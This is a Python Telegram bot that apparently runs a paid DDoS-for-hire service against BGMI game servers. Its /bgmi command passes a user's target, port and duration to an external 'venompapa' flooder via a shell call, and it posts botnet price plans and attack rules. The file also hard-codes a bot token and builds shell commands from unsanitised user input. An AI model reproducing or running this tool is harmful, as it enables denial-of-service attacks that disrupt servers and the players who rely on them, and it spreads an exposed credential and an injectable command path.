#bgmiddoserpython

import telebot
import subprocess
import datetime
import os

from keep_alive import keep_alive
keep_alive()
# Insert your Telegram bot token here
bot = telebot.TeleBot('7946938434:AAFqXEOzENcI0zgse9iezbfP8mrs4DDHlf4')

# Admin user IDs
admin_id = {"930577300"}

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"𝗜𝗴𝗻𝗼𝗿𝗶𝗻𝗴 𝗶𝗻𝘃𝗮𝗹𝗶𝗱 𝗹𝗶𝗻𝗲 𝗶𝗻 𝗳𝗿𝗲𝗲 𝘂𝘀𝗲𝗿 𝗳𝗶𝗹𝗲: {line}")
    except FileNotFoundError:
        pass

allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"𝗨𝘀𝗲𝗿𝗜𝗗: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: {username}\n𝗧𝗮𝗿𝗴𝗲𝘁: {target}\n𝗣𝗼𝗿𝘁: {port}\n𝗧𝗶𝗺𝗲: {time}\n\n")


# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "𝗟𝗼𝗴𝘀 𝗮𝗿𝗲 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗰𝗹𝗲𝗮𝗿𝗲𝗱. 𝗡𝗼 𝗱𝗮𝘁𝗮 𝗳𝗼𝘂𝗻𝗱 ."
            else:
                file.truncate(0)
                response = "𝗟𝗼𝗴𝘀 𝗰𝗹𝗲𝗮𝗿𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 ✅"
    except FileNotFoundError:
        response = "𝗡𝗼 𝗹𝗼𝗴𝘀 𝗳𝗼𝘂𝗻𝗱 𝘁𝗼 𝗰𝗹𝗲𝗮𝗿."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"𝗨𝘀𝗲𝗿 𝗜𝗗: {user_id} | 𝗧𝗶𝗺𝗲: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | 𝗧𝗮𝗿𝗴𝗲𝘁: {target}"
    if port:
        log_entry += f" | 𝗣𝗼𝗿𝘁: {port}"
    if time:
        log_entry += f" | 𝗧𝗶𝗺𝗲: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"𝗨𝘀𝗲𝗿 {user_to_add} 𝗔𝗱𝗱𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 👍."
            else:
                response = "𝗨𝘀𝗲𝗿 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗲𝘅𝗶𝘀𝘁𝘀 🤦‍♂️."
        else:
            response = "𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗽𝗲𝗰𝗶𝗳𝘆 𝗮 𝘂𝘀𝗲𝗿 𝗜𝗗 𝘁𝗼 𝗮𝗱𝗱 😒."
    else:
        response = "𝗢𝗻𝗹𝘆 𝗣𝗮𝗽𝗮 𝗖𝗮𝗻 𝗨𝘀𝗲 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱."

    bot.reply_to(message, response)



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"𝗨𝘀𝗲𝗿 {user_to_remove} 𝗿𝗲𝗺𝗼𝘃𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 👍."
            else:
                response = f"𝗨𝘀𝗲𝗿 {user_to_remove} 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱 𝗶𝗻 𝘁𝗵𝗲 𝗹𝗶𝘀𝘁."
        else:
            response = '''𝗣𝗹𝗲𝗮𝘀𝗲 𝗦𝗽𝗲𝗰𝗶𝗳𝘆 𝗔 𝗨𝘀𝗲𝗿 𝗜𝗗 𝘁𝗼 𝗥𝗲𝗺𝗼𝘃𝗲. 
✅ 𝗨𝘀𝗮𝗴𝗲: /remove <𝘂𝘀𝗲𝗿𝗶𝗱>'''
    else:
        response = "𝗢𝗻𝗹𝘆 𝗣𝗮𝗽𝗮 𝗖𝗮𝗻 𝗨𝘀𝗲 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱."

    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "𝗟𝗼𝗴𝘀 𝗮𝗿𝗲 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗰𝗹𝗲𝗮𝗿𝗲𝗱. 𝗡𝗼 𝗱𝗮𝘁𝗮 𝗳𝗼𝘂𝗻𝗱 ."
                else:
                    file.truncate(0)
                    response = "𝗟𝗼𝗴𝘀 𝗖𝗹𝗲𝗮𝗿𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 ✅"
        except FileNotFoundError:
            response = "𝗟𝗼𝗴𝘀 𝗮𝗿𝗲 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗰𝗹𝗲𝗮𝗿𝗲𝗱 ."
    else:
        response = "𝗢𝗻𝗹𝘆 𝗣𝗮𝗽𝗮 𝗖𝗮𝗻 𝗨𝘀𝗲 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱."
    bot.reply_to(message, response)

 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "𝗔𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝗨𝘀𝗲𝗿𝘀:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "𝗡𝗼 𝗱𝗮𝘁𝗮 𝗳𝗼𝘂𝗻𝗱 "
        except FileNotFoundError:
            response = "𝗡𝗼 𝗱𝗮𝘁𝗮 𝗳𝗼𝘂𝗻𝗱 "
    else:
        response = "𝗢𝗻𝗹𝘆 𝗣𝗮𝗽𝗮 𝗖𝗮𝗻 𝗨𝘀𝗲 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱."
    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "𝗡𝗼 𝗱𝗮𝘁𝗮 𝗳𝗼𝘂𝗻𝗱 ."
                bot.reply_to(message, response)
        else:
            response = "𝗡𝗼 𝗱𝗮𝘁𝗮 𝗳𝗼𝘂𝗻𝗱 "
            bot.reply_to(message, response)
    else:
        response = "𝗢𝗻𝗹𝘆 𝗣𝗮𝗽𝗮 𝗖𝗮𝗻 𝗨𝘀𝗲 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱."
        bot.reply_to(message, response)


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"🤖𝗬𝗼𝘂𝗿 𝗜𝗗: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗥𝗧𝗘𝗗.🔥🔥\n\n𝘁𝗮𝗿𝗴𝗲𝘁: {target}\n𝗽𝗼𝗿𝘁: {port}\n𝘁𝗶𝗺𝗲: {time} 𝗦𝗲𝗰𝗼𝗻𝗱𝘀\n𝗠𝗲𝘁𝗵𝗼𝗱: BGMI"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 5:
                response = "𝗬𝗼𝘂 𝗔𝗿𝗲 𝗢𝗻 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 . 𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁 5𝗺𝗶𝗻 𝗕𝗲𝗳𝗼𝗿𝗲 𝗥𝘂𝗻𝗻𝗶𝗻𝗴 𝗧𝗵𝗲 /bgmi 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗔𝗴𝗮𝗶𝗻.."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert time to integer
            time = int(command[3])  # Convert port to integer
            if time > 240:
                response = "𝗘𝗿𝗿𝗼𝗿: 𝗧𝗶𝗺𝗲 𝗶𝗻𝘁𝗲𝗿𝘃𝗮𝗹 𝗺𝘂𝘀𝘁 𝗯𝗲 𝗹𝗲𝘀𝘀 𝘁𝗵𝗮𝗻 240."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./venompapa {target} {port} {time} 1200"
                subprocess.run(full_command, shell=True)
                response = f"𝗕𝗚𝗠𝗜 𝗔𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱. 𝘁𝗮𝗿𝗴𝗲𝘁: {target} 𝗽𝗼𝗿𝘁: {port} 𝘁𝗶𝗺𝗲: {time}"
        else:
            response = "✅ 𝗨𝘀𝗮𝗴𝗲 :- /bgmi <𝘁𝗮𝗿𝗴𝗲𝘁> <𝗽𝗼𝗿𝘁> <𝘁𝗶𝗺𝗲>"  # Updated command syntax
    else:
        response = " 𝗢𝗻𝗹𝘆 𝗣𝗮𝗽𝗮 𝗖𝗮𝗻 𝗨𝘀𝗲 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 ."

    bot.reply_to(message, response)



# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"𝗨𝘀𝗲𝗿𝗜𝗗: {user_id}" in log]
                if user_logs:
                    response = "𝗬𝗼𝘂𝗿 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗟𝗼𝗴𝘀:\n" + "".join(user_logs)
                else:
                    response = " 𝗡𝗼 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗟𝗼𝗴𝘀 𝗙𝗼𝘂𝗻𝗱 𝗙𝗼𝗿 𝗬𝗼𝘂 ."
        except FileNotFoundError:
            response = "𝗡𝗼 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗹𝗼𝗴𝘀 𝗳𝗼𝘂𝗻𝗱."
    else:
        response = "𝗢𝗻𝗹𝘆 𝗣𝗮𝗽𝗮 𝗖𝗮𝗻 𝗨𝘀𝗲 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 ."

    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''🤖 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗰𝗼𝗺𝗺𝗮𝗻𝗱𝘀:
💥 /bgmi : 𝗠𝗲𝘁𝗵𝗼𝗱 𝗙𝗼𝗿 𝗕𝗴𝗺𝗶 𝗦𝗲𝗿𝘃𝗲𝗿𝘀. 
💥 /rules : 𝗣𝗹𝗲𝗮𝘀𝗲 𝗖𝗵𝗲𝗰𝗸 𝗕𝗲𝗳𝗼𝗿𝗲 𝗨𝘀𝗲 !!.
💥 /mylogs : 𝗧𝗼 𝗖𝗵𝗲𝗰𝗸 𝗬𝗼𝘂𝗿 𝗥𝗲𝗰𝗲𝗻𝘁𝘀 𝗔𝘁𝘁𝗮𝗰𝗸𝘀.
💥 /plan : 𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁 𝗢𝘂𝗿 𝗕𝗼𝘁𝗻𝗲𝘁 𝗥𝗮𝘁𝗲𝘀.

🤖 𝗧𝗼 𝗦𝗲𝗲 𝗔𝗱𝗺𝗶𝗻 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀:
💥 /admincmd : 𝗦𝗵𝗼𝘄𝘀 𝗔𝗹𝗹 𝗔𝗱𝗺𝗶𝗻 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀.

'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''👋🏻𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗬𝗼𝘂𝗿 𝗛𝗼𝗺𝗲, {user_name}! 𝗙𝗲𝗲𝗹 𝗙𝗿𝗲𝗲 𝘁𝗼 𝗘𝘅𝗽𝗹𝗼𝗿𝗲.
🤖𝗧𝗿𝘆 𝗧𝗼 𝗥𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 : /help 
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} 𝗣𝗹𝗲𝗮𝘀𝗲 𝗙𝗼𝗹𝗹𝗼𝘄 𝗧𝗵𝗲𝘀𝗲 𝗥𝘂𝗹𝗲𝘀 ⚠️:

1. 𝗗𝗼𝗻𝘁 𝗥𝘂𝗻 𝗧𝗼𝗼 𝗠𝗮𝗻𝘆 𝗔𝘁𝘁𝗮𝗰𝗸𝘀 !! 𝗖𝗮𝘂𝘀𝗲 𝗔 𝗕𝗮𝗻 𝗙𝗿𝗼𝗺 𝗕𝗼𝘁
2. 𝗗𝗼𝗻𝘁 𝗥𝘂𝗻 2 𝗔𝘁𝘁𝗮𝗰𝗸𝘀 𝗔𝘁 𝗦𝗮𝗺𝗲 𝗧𝗶𝗺𝗲 𝗕𝗲𝗰𝘇 𝗜𝗳 𝗨 𝗧𝗵𝗲𝗻 𝗨 𝗚𝗼𝘁 𝗕𝗮𝗻𝗻𝗲𝗱 𝗙𝗿𝗼𝗺 𝗕𝗼𝘁. 
3. 𝗪𝗲 𝗗𝗮𝗶𝗹𝘆 𝗖𝗵𝗲𝗰𝗸𝘀 𝗧𝗵𝗲 𝗟𝗼𝗴𝘀 𝗦𝗼 𝗙𝗼𝗹𝗹𝗼𝘄 𝘁𝗵𝗲𝘀𝗲 𝗿𝘂𝗹𝗲𝘀 𝘁𝗼 𝗮𝘃𝗼𝗶𝗱 𝗕𝗮𝗻!!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:

𝗩𝗶𝗽 🌟 :
-> 𝗔𝘁𝘁𝗮𝗰𝗸 𝘁𝗶𝗺𝗲 : 180 (𝗦)
> 𝗔𝗳𝘁𝗲𝗿 𝗔𝘁𝘁𝗮𝗰𝗸 𝗟𝗶𝗺𝗶𝘁 : 5 𝗠𝗶𝗺
-> 𝗖𝗼𝗻𝗰𝘂𝗿𝗲𝗻𝘁 𝗮𝘁𝘁𝗮𝗰𝗸𝘀 : 3

𝗣𝗿-𝗶𝗰𝗲 𝗹𝗶𝘀𝘁💸 :
𝗗𝗮𝘆-->100 𝗥𝘀
𝗪𝗲𝗲𝗸-->400 𝗥𝘀
𝗠𝗼𝗻𝘁𝗵-->800 𝗥𝘀
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 𝗔𝗱𝗺𝗶𝗻 𝗰𝗼𝗺𝗺𝗮𝗻𝗱𝘀 𝗮𝗿𝗲 𝗵𝗲𝗿𝗲!!:

💥 /add <𝗨𝘀𝗲𝗿_𝗜𝗱> : 𝗔𝗱𝗱 𝗮 𝘂𝘀𝗲𝗿.
💥 /remove <𝗨𝘀𝗲𝗿_𝗜𝗱> 𝗥𝗲𝗺𝗼𝘃𝗲 𝗮 𝘂𝘀𝗲𝗿.
💥 /allusers : 𝗔𝘂𝘁𝗵𝗼𝗿𝗶𝘀𝗲𝗱 𝘂𝘀𝗲𝗿𝘀 𝗹𝗶𝘀𝘁𝘀.
💥 /logs : 𝗔𝗹𝗹 𝘂𝘀𝗲𝗿𝘀 𝗹𝗼𝗴𝘀.
💥 /broadcast : 𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁 𝘁𝗼 𝘂𝘀𝗲𝗿𝘀.
💥 /clearlogs : 𝗖𝗹𝗮𝗲𝗿 𝗹𝗼𝗴𝘀 𝗳𝗶𝗹𝗲.
'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ 𝗠𝗲𝘀𝘀𝗴𝗲 𝘁𝗼 𝗮𝗹𝗹 𝘂𝘀𝗲𝗿𝘀 𝗯𝘆 𝘆𝗼𝘂𝗿 𝗽𝗮𝗽𝗮:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"𝗙𝗶𝗹𝗲𝗱 𝘁𝗼 𝘀𝗲𝗻𝘁 𝗯𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁 𝗺𝘀𝗴 𝘁𝗼 𝘂𝘀𝗲𝗿𝘀 {user_id}: {str(e)}")
            response = "𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁 𝗺𝗲𝘀𝘀𝗲𝗴𝗲 𝘀𝗲𝗻𝘁 𝘁𝗼 𝗮𝗹𝗹 𝘂𝘀𝗲𝗿𝘀 👍."
        else:
            response = "🤖 𝗞𝗼𝗶 𝗺𝘀𝗴 𝗱𝗼 𝗷𝗶𝘀𝘀𝗲 𝗷𝗼 𝗯𝗮𝗻𝗱𝗲 𝗶𝘀𝗲 𝗸𝗮𝗿 𝗿𝗵 𝗵𝗮 𝘂𝗻𝗽𝗲 𝗺𝘀𝗴 𝗷𝗮𝗶 ."
    else:
        response = "𝗢𝗻𝗹𝘆 𝗣𝗮𝗽𝗮 𝗖𝗮𝗻 𝗨𝘀𝗲 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱."

    bot.reply_to(message, response)




#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
